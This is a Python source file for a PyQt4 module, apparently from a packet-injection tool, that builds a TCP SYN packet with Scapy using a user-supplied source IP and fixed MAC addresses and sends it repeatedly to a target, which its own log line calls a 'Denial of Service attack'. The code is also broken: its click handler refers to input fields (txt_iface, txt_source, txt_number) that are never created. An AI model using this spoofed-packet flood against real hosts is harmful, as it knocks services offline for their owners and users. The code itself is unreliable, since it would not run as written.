from PyQt4.QtCore import QThread
from PyQt4.QtCore import pyqtSlot
from PyQt4.QtGui import QWidget, QGridLayout, QLabel, QPushButton, QLineEdit
from scapy.all import *
from injector_lib import getFlags

class Module_Run_Script(QThread):
    def __init__(self):
        QThread.__init__(self)

    def __del__(self):
        self.wait()

    def setupUI(self):
        window = QWidget()
        window.setWindowTitle('Run script')
        window.resize(300, 180)
        window_layout = QGridLayout()
        window.setLayout(window_layout)

        lbl_target = QPushButton("Load file")
        txt_target = QLineEdit()
        window_layout.addWidget(lbl_target, 0, 0)
        window_layout.addWidget(txt_target, 0, 1)

        btn_att = QPushButton("Attack!")
        window_layout.addWidget(btn_att, 5, 0)

        @pyqtSlot()
        def on_click():
            self.log_textBox.appendText("Denial of Service attack starting...\n")
            self.setTarget(txt_iface.text(), txt_target.text(), txt_source.text(), txt_number.text())
            #self.setTarget("", "192.168.122.95", "192.168.122.142", 10)
            window.close()
            self.attack()

        btn_att.clicked.connect(on_click)

        return window


    def setTextBox(self, log_textBox, original_textBox, new_textBox):
        self.log_textBox = log_textBox
        self.original_textBox = original_textBox
        self.new_textBox = new_textBox

    def setTarget(self, iface, target_ip, source_ip, numberPackages):
        self.iface = iface
        self.target_ip = target_ip
        self.source_ip = source_ip
        self.numberPackages = int(numberPackages)

    def attack(self):
        self.pacote = Ether()/IP()/TCP()

        self.pacote[Ether].src = "67:21:EC:A9:D0:A3"
        self.pacote[Ether].dst = "C9:BA:67:7D:D2:DC"

        self.pacote[IP].src = self.source_ip
        self.pacote[IP].dst = self.target_ip

        self.pacote[IP].version = 4
        self.pacote[IP].ihl = 5
        self.pacote[IP].tos = 0x0
        self.pacote[IP].len = 40
        self.pacote[IP].id = 8662
        self.pacote[IP].flags = "DF"
        self.pacote[IP].frag = 0
        self.pacote[IP].ttl = 64
        self.pacote[IP].proto = "tcp"

        self.pacote[TCP].sport = 54167
        self.pacote[TCP].dport = 8080
        self.pacote[TCP].seq = 1822340216
        self.pacote[TCP].ack = 0
        self.pacote[TCP].dataofs = 10
        self.pacote[TCP].reserved = 0
        self.pacote[TCP].flags = "S"
        self.pacote[TCP].window = 29200
        self.pacote[TCP].urgptr = 0
        self.pacote[TCP].options={}


        self.start()

    def run(self):
        sendp(self.pacote, iface=self.iface, count = self.numberPackages)